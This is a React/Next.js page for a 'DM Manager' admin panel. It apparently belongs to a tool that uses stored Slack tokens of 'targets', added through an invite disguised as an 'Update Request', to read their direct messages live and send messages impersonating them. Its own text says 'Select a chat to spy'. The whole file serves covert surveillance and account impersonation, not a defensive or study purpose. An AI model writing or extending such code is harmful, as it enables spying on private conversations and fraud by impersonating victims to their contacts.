/* eslint-disable react-hooks/immutability */
/* eslint-disable @typescript-eslint/no-explicit-any */
// app/dm-manager/page.tsx
"use client";
import React, { useEffect, useState } from 'react';
import { collection, onSnapshot } from 'firebase/firestore';
import { Send, User, MessageSquare, Shield, Link as LinkIcon, Lock, AlertCircle, Trash2, Edit, X, Check, Clock } from 'lucide-react';
import { db } from '../../lib/firebase';
import { convertEmojis } from '../../utils/emojiConverter';

export default function DMManager() {
  const [connectedUsers, setConnectedUsers] = useState<any[]>([]);
  const [activeUser, setActiveUser] = useState<any>(null);
  const [chats, setChats] = useState<any[]>([]);
  const [activeChat, setActiveChat] = useState<any>(null);
  const [messages, setMessages] = useState<any[]>([]);
  const [inputText, setInputText] = useState('');
  const [inviteId, setInviteId] = useState('');
  const [inviteStatus, setInviteStatus] = useState<{msg: string, type: string}>({msg: '', type: ''});
  const [loadingMsg, setLoadingMsg] = useState(false);

  // Load Users
  useEffect(() => {
    const unsub = onSnapshot(collection(db, "slack_tokens"), (snap) => {
      setConnectedUsers(snap.docs.map(d => ({ id: d.id, ...d.data() })));
    });
    return () => unsub();
  }, []);

  // Load Chats (Optimized)
  useEffect(() => {
    if (!activeUser) return;
    setChats([]); // Clear old chats instantly
    fetch('/api/slack/manager', {
        method: 'POST',
        body: JSON.stringify({ action: 'list_chats', targetUserId: activeUser.id })
    })
    .then(r => r.json())
    .then(d => setChats(d.chats || []));
  }, [activeUser]);

  // Load Messages (Fast)
  useEffect(() => {
    if (!activeChat) return;
    setMessages([]); // Clear instantly for speed perception
    setLoadingMsg(true);
    loadMessages();
    
    // Auto refresh every 3 seconds
    const interval = setInterval(loadMessages, 3000);
    return () => clearInterval(interval);
  }, [activeChat]);

  const loadMessages = async () => {
    if(!activeUser || !activeChat) return;
    try {
        const res = await fetch('/api/slack/manager', {
            method: 'POST',
            body: JSON.stringify({ 
              action: 'get_messages', 
              targetUserId: activeUser.id, 
              channelId: activeChat.id,
              channelName: activeChat.name
            })
        });
        const data = await res.json();
        if(data.messages) {
            setMessages(data.messages);
            setLoadingMsg(false);
        }
    } catch(e) { console.error(e); }
  };

  const sendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if(!inputText.trim()) return;
    
    // Optimistic Update (Show immediately before server responds)
    const tempMsg = { text: inputText, user: activeUser.id, ts: Date.now().toString() };
    setMessages(prev => [tempMsg, ...prev]);
    const txt = inputText;
    setInputText('');

    await fetch('/api/slack/manager', {
        method: 'POST',
        body: JSON.stringify({ 
          action: 'send_as_user', 
          targetUserId: activeUser.id, 
          channelId: activeChat.id, 
          text: txt,
          channelName: activeChat.name
        })
    });
    loadMessages(); // Refresh to get real TS
  };

  const sendInvite = async () => {
    if(!inviteId) return;
    setInviteStatus({ msg: 'Sending Update Request...', type: '' });
    
    try {
        const res = await fetch('/api/slack/manager', {
            method: 'POST',
            body: JSON.stringify({ action: 'send_invite', targetUserId: inviteId.trim() })
        });
        const data = await res.json();
        if(data.success) {
            setInviteStatus({ msg: '✅ Request Sent! Waiting for user...', type: 'success' });
            setInviteId('');
        } else {
            setInviteStatus({ msg: `❌ Error: ${data.error}`, type: 'error' });
        }
    } catch (e) { setInviteStatus({ msg: '❌ Error', type: 'error' }); }
  };

  const handleDeleteUser = async (userId: string, e: React.MouseEvent) => {
    e.stopPropagation();
    if(!confirm("Remove user?")) return;
    if(activeUser?.id === userId) { setActiveUser(null); setChats([]); setActiveChat(null); }
    await fetch('/api/slack/manager', {
        method: 'POST',
        body: JSON.stringify({ action: 'delete_user', targetUserId: userId })
    });
  };

  return (
    <div className="flex h-screen bg-black text-white font-sans overflow-hidden">
        
        {/* LEFT: Sidebar */}
        <div className="w-80 bg-gray-900 border-r border-gray-800 flex flex-col">
            <div className="p-4 border-b border-gray-800">
                <h2 className="font-bold text-amber-500 flex items-center gap-2">
                    <Shield className="h-5 w-5" /> Admin Panel
                </h2>
            </div>
            
            {/* Invite Section */}
            <div className="p-4 bg-gray-800/50 m-2 rounded-xl border border-gray-700">
                <label className="text-xs text-gray-400 mb-2 block font-semibold">ADD TARGET</label>
                <div className="flex gap-2">
                    <input 
                        className="bg-gray-900 border border-gray-700 rounded-lg p-2 text-sm w-full text-white outline-none focus:border-blue-500"
                        placeholder="User ID (U0...)"
                        value={inviteId}
                        onChange={e => setInviteId(e.target.value)}
                    />
                    <button onClick={sendInvite} className="bg-blue-600 px-3 rounded-lg hover:bg-blue-500">
                        <LinkIcon className="h-4 w-4" />
                    </button>
                </div>
                {inviteStatus.msg && <div className={`mt-2 text-xs ${inviteStatus.type==='error'?'text-red-400':'text-green-400'}`}>{inviteStatus.msg}</div>}
            </div>

            {/* List Users */}
            <div className="flex-1 overflow-y-auto p-2">
                <p className="text-xs text-gray-500 px-2 mb-2 mt-4 font-semibold">ACTIVE TARGETS</p>
                {connectedUsers.map(u => (
                    <div key={u.id} onClick={() => { setActiveUser(u); setActiveChat(null); }}
                        className={`group w-full flex items-center justify-between p-3 rounded-lg cursor-pointer mb-1 ${activeUser?.id === u.id ? 'bg-amber-500/20 border border-amber-500/50' : 'hover:bg-gray-800'}`}>
                        <div className="flex items-center gap-3">
                            <img src={u.image} className="w-8 h-8 rounded-full bg-gray-700" />
                            <div><div className="font-medium text-sm">{u.name}</div><div className="text-[10px] opacity-60">{u.id}</div></div>
                        </div>
                        <button onClick={(e) => handleDeleteUser(u.id, e)} className="p-1.5 hover:bg-red-500/20 text-red-400 opacity-0 group-hover:opacity-100"><Trash2 className="h-4 w-4" /></button>
                    </div>
                ))}
            </div>
        </div>

        {/* MIDDLE: Chat List */}
        <div className="w-80 bg-gray-900/50 border-r border-gray-800 flex flex-col">
            <div className="p-4 border-b border-gray-800 h-16 flex items-center justify-between bg-gray-900">
                <h3 className="font-semibold text-gray-200">{activeUser ? activeUser.name + "'s DMs" : 'Select Target'}</h3>
            </div>
            <div className="flex-1 overflow-y-auto">
                {chats.map(chat => (
                    <button key={chat.id} onClick={() => setActiveChat(chat)}
                        className={`w-full p-4 border-b border-gray-800/50 flex items-center gap-3 hover:bg-gray-800/50 ${activeChat?.id === chat.id ? 'bg-blue-500/10 border-l-2 border-l-blue-500' : ''}`}>
                        {chat.image ? <img src={chat.image} className="w-9 h-9 rounded-lg" /> : <div className="w-9 h-9 bg-gray-700 rounded-lg flex center"><User className="w-5 h-5 text-gray-400" /></div>}
                        <div className="text-left overflow-hidden flex-1">
                            <div className="text-sm font-medium text-gray-200 truncate">{chat.name}</div>
                            <div className="text-xs text-gray-500 truncate">{chat.id}</div>
                        </div>
                    </button>
                ))}
            </div>
        </div>

        {/* RIGHT: Active Chat */}
        <div className="flex-1 flex flex-col bg-gray-950">
            {activeChat ? (
                <>
                    <div className="h-16 border-b border-gray-800 flex items-center justify-between px-6 bg-gray-900/80 backdrop-blur-md">
                        <div className="font-bold text-lg">{activeChat.name} <span className="text-xs bg-red-900 text-red-200 px-2 rounded ml-2">LIVE</span></div>
                    </div>

                    <div className="flex-1 overflow-y-auto p-6 flex flex-col-reverse gap-4">
                        {loadingMsg && <div className="text-center text-gray-500">Loading history...</div>}
                         <div className="flex flex-col gap-2">
                            {messages.map((m, i) => {
                                const isMe = m.user === activeUser.id; 
                                return (
                                    <div key={i} className={`flex ${isMe ? 'justify-end' : 'justify-start'}`}>
                                        <div className={`max-w-[75%] p-3 rounded-2xl text-sm ${isMe ? 'bg-blue-600 text-white rounded-tr-sm' : 'bg-gray-800 text-gray-200 rounded-tl-sm'}`}>
                                            <div className="whitespace-pre-wrap">{convertEmojis(m.text)}</div>
                                            <div className="text-[10px] opacity-50 mt-1 flex justify-end gap-1">
                                                {new Date(parseFloat(m.ts)*1000).toLocaleTimeString()}
                                            </div>
                                        </div>
                                    </div>
                                )
                            })}
                        </div>
                    </div>

                    <form onSubmit={sendMessage} className="p-4 bg-gray-900 border-t border-gray-800">
                        <div className="relative flex items-center gap-2 max-w-4xl mx-auto">
                            <input value={inputText} onChange={e => setInputText(e.target.value)}
                                className="flex-1 bg-gray-800 border-gray-700 border rounded-xl px-4 py-3 text-white focus:border-blue-500 outline-none"
                                placeholder={`Reply as ${activeUser?.name}...`} />
                            <button type="submit" className="bg-blue-600 hover:bg-blue-500 p-3 rounded-xl"><Send className="h-5 w-5" /></button>
                        </div>
                    </form>
                </>
            ) : (
                <div className="flex-1 flex items-center justify-center text-gray-600 flex-col">
                    <MessageSquare className="h-10 w-10 opacity-30 mb-2" />
                    <p>Select a chat to spy</p>
                </div>
            )}
        </div>
    </div>
  );
}